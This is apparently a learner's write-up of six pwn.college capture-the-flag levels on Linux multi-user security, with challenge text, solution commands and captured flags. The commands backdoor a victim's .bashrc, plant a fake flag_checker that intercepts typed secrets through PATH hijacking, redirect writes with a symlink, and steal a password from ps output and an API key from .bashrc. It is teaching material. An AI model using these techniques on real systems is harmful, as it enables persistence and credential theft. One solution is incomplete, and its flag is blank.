# Bashrc Backdoor

When your shell starts up, it looks for `.bashrc` file in your home directory and executes it as a startup script. You can customize your `/home/hacker/.bashrc` with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's `.bashrc` is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a `echo "Hackers were here!"` at the end of their `.bashrc`. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as `.bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named `zardus`, with a home directory of `/home/zardus`. You, as the `hacker` user, have write access to his `.bashrc`, and `zardus` has read-access to `/flag`. The victim is simulated by the script `/challenge/victim`, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

HINT: Like the scripts you explored in `Chaining Commands`, the `.bashrc` script is just a shell script. Adding a new line with a command on it (e.g., `echo Hello Hackers`) will get that command executed, so all you really need to think about is what command will get you the flag!

NOTE: The victim's `/home/zardus/.bashrc` will have a lot of stuff already in it: the shell's startup is a complex affair. Don't panic --- just add your payload to the end and hope for the best!

HINT: Need to poke around as `zardus` to debug your solution? In practice mode, you can use `sudo su --login zardus` to drop into a Zardus session!

## Solution:

- `echo "cat /flag" >> /home/zardus/.bashrc` to add a command to `zardus`'s `.bashrc` that reads the flag.
- `/challenge/victim` prints the flag.

## Flag: 

```
pwn.college{kAWdIC64ndWUTtgKhAZXkwhf122.0VMzEzNxwCO0AzNzEzW}
```

### References:

- none

### Notes:

- `.bashrc` executes automatically when user logs into shell.
- When the shell starts up, it looks for `.bashrc` file in the home directory and executes it as a `startup script`.
- Malicious software, for example, often targets startup scripts such as `.bashrc` to maintain persistence into the future.



# Sniffing Input

In the previous level, you abused Zardus's `~/.bashrc` to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named `flag_checker`, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's `.bashrc` to intercept this flag. Remember how you hijacked commands in the `Pondering PATH` module? Can you use that capability to hijack the `flag_checker`?

HINT: Is Zardus getting spooked by your hijack? He's careful --- he checks for the `flag_checker` prompt of `Type the flag`. Make sure your hijack also prints this prompt (e.g., `echo "Type the flag"`). Other than printing that prompt, your fake `flag_checker` can either just a) `cat` Zardus's input to stdout (e.g., `cat with no arguments`) or b) `read` it into a variable and `echo` it out. Up to you!

HINT: Don't forget to make your fake `flag_checker` executable, like you learned in the `Perceiving Permissions` module!

## Solution:

- `echo -e '#!/bin/bash\necho "Type the flag"\ncat' > /home/hacker/flag_checker` to create a fake `flag_checker` that intercepts the input.
- `chmod +x /home/hacker/flag_checker` makes it executable.
- `echo 'export PATH="/home/hacker:$PATH"' >> /home/zardus/.bashrc` add a PATH hijack  to `zardus`'s `.bashrc`.
- `/challenge/victim` gives the flag.

## Flag: 

```
pwn.college{EN1Ws4aqiHcj8jR_RJ5q6rHrJNH.0VNzEzNxwCO0AzNzEzW}
```

### References:

- none

### Notes:

- PATH hijacking can be made persistent by embedding it in startup scripts like `.bashrc`, ensuring the attack survives across multiple login sessions.



# Overshared Directories

Alright, Zardus has wised up --- why would he have a writable `.bashrc`, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:

```sh
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```
And then a hacker comes along and does the following, despite not owning the todo-list file!

```sh
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: `hacker` has no write access to the `todo-list` but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:

```sh
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as `.bashrc`! Can you replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`?

## Solution:

- `echo -e '#!/bin/bash\necho "Type the flag"\nread input\necho "$input" > /home/hacker/stolen_flag\necho "$input"' > /home/hacker/flag_checker && chmod +x /home/hacker/flag_checker` creates a fake `flag_checker` that saves the input.
- `/challenge/victim` prints the flag.

## Flag: 

```
pwn.college{}
```

### References:

- none

### Notes:

Include things you learnt, alternate methods or mistakes you made while solving



# Tricky Linking

Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing `/tmp/collab`. He's made that directory world-readable and has started a list of evil commands to remember!

```sh
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
```
In this challenge, when you run `/challenge/victim`, Zardus will add `cat /flag` to that list of commands:

```sh
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```
Recall from the previous level that, having write access to `/tmp/collab`, the `hacker` user can replace that `evil-commands.txt` file. Also remember from `Comprehending Commands` that files can link to other files. What happens if `hacker` replaces `evil-commands.txt` with a symbolic link to some sensitive file that `zardus` can write to? Chaos and shenanigans!

You know the file to link to. Pull off the attack, and get `/flag` (which, for this level, Zardus can read again!).

HINT: You'll need to run `/challenge/victim` twice: once to get `cat /flag` written to where you want, and once to trigger it!

Is `/tmp` dangerous to use??? Despite the attack shown here, `/tmp` can be used safely. The directory is world-writable, but has a special permission bit set:

```sh
hacker@dojo:~$ ls -ld /tmp
drwxrwxrwt 29 root root 1056768 Jun  6 14:06 /tmp
hacker@dojo:~$
```
That `t` bit at the end is the sticky bit. The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory. It's designed to prevent this exact attack! The problem in this challenge, of course, was that Zardus did not enable the sticky bit on `/tmp/collab`. This would have closed the hole in this specific case:

```sh
zardus@dojo:~$ chmod +t /tmp/collab
```
Of course, shared resources like world-writable directories are still dangerous. Much later, in the `Race Conditions` of the Green Belt material, you'll see many ways in which such resources can cause security issues!

## Solution:

- `rm /tmp/collab/evil-commands.txt` removes the file.
- `ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt` creates the symbolic link.
- `/challenge/victim` is the first run so it appends "cat /flag" to `.bashrc`.
- `/challenge/victim` is run a second time and this time the `.bashrc` executes and shows flag.

## Flag: 

```
pwn.college{06Ymg_VT2mLSFYzPYzUFg-dILmR.0VM0EzNxwCO0AzNzEzW}
```

### References:

- none

### Notes:

- That `t` bit at the end is the sticky bit.
- The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory.
- It's designed to prevent this exact attack.



# Sniffing Process Arguments

Poor Zardus; you've hacked him pretty heavily. But he's wisened up and secured his home directory! Game over?

Not quite! One of the things that people often don't think about when there are multiple accounts on one computer is what kind of data their command invocations leak. Remember, when you do `ps aux`, you get:

```sh
hacker@dojo:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
hacker         1  0.0  0.0   1128     4 ?        Ss   05:34   0:00 /sbin/docker-init -- /bin/sleep 6h
hacker         7  0.0  0.0   2736   580 ?        S    05:34   0:00 /bin/sleep 6h
hacker       102  0.4  0.0 723944 64660 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       138  3.3  0.0 968792 106272 ?       Sl   05:34   0:07 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       287  0.0  0.0 717648 53136 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       318  3.3  0.0 977472 98256 ?        Sl   05:34   0:06 /usr/lib/code-server/lib/node --dns-result-order=
hacker       554  0.4  0.0 650560 55360 ?        Rl   05:35   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       571  0.0  0.0   4600  4032 pts/0    Ss   05:35   0:00 /usr/bin/bash --init-file /usr/lib/code-server/li
hacker      1172  0.0  0.0   5892  2924 pts/0    R+   05:38   0:00 ps aux
hacker@dojo:~$
```
But what would happen if one of the arguments of one of those commands was something sensitive, like the flag or a password? This happens, and nefarious users sharing the same machine (or somehow otherwise listing processes on it) can steal that data and use it!

That's what this challenge explores. Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use `sudo` (and, thus, to `sudo cat /flag`!). Steal the password, log in to Zardus' account (recall the `su` command from the `Untangling Users` module), and get that flag!

## Solution:

- `ps aux | grep zardus` for checking the running processes for `zardus`'s password.
- `su zardus` to switch the user and enter the password received from the previous command, that is, `pw_323315806`.
- `sudo cat /flag` prints the flag.

## Flag: 

```
pwn.college{EeqrRcgNOM1XP-ON0SK4yD5vR5h.0FOzEzNxwCO0AzNzEzW}
```

### References:

- none

### Notes:

- The `ps aux` command shows all running processes with their full command lines, including any arguments passed to them.



# Snooping on Configurations

Even without making mistakes, users might inadvertently leave themselves at risk. For example, many files in a typical user's home directory are world-readable by default, despite frequently being used to store sensitive information. Believe it or not, your `.bashrc` is world-readable unless you explicitly change it!

```sh
hacker@dojo:~$ ls -l ~/.bashrc
-rw-r--r-- 1 hacker hacker 148 Jun  7 05:56 /home/hacker/.bashrc
hacker@dojo:~$
```
You might think, "Hey, at least it's not world-writable by default"! But even world-readable, it can do damage. Since `.bashrc` is processed by the shell at startup, that is where people typically put initializations for any environment variables they want to customize. Most of the time, this is innocuous things like `PATH`, but sometimes people store API keys there for easy access. For example, in this challenge:

```sh
zardus@dojo:~$ echo "FLAG_GETTER_API_KEY=sk-XXXYYYZZZ" > ~/.bashrc
```
Afterwards, Zardus can easily refer to the API key. In this level, users can use a valid API key to get the flag:

```sh
zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
```
Naturally, Zardus stores his key in `.bashrc`. Can you steal the key and get the flag?

NOTE: When you get the API key, just execute `flag_getter` as the `hacker` user. This challenge's `/challenge/victim` is just for theming: you don't need to use it.

## Solution:

- `cat /home/zardus/.bashrc` to read `zarcus`'s `.bashrc` file.
- API key is found in this line `FLAG_GETTER_API_KEY=sk-2078221616`.
- `flag_getter --key sk-2078221616` is executed.
- It asks "Do you want me to print the key (y/n)?". Enter `y`.
- The flag is printed.

## Flag: 

```
pwn.college{kWuHJqVMjzlvlgBFy7L8DxOKL38.0lM0EzNxwCO0AzNzEzW}
```

### References:

- none

### Notes:

- Environment variables stored in `.bashrc` are visible to all users who can read the file, exposing API keys, passwords, and other secrets.


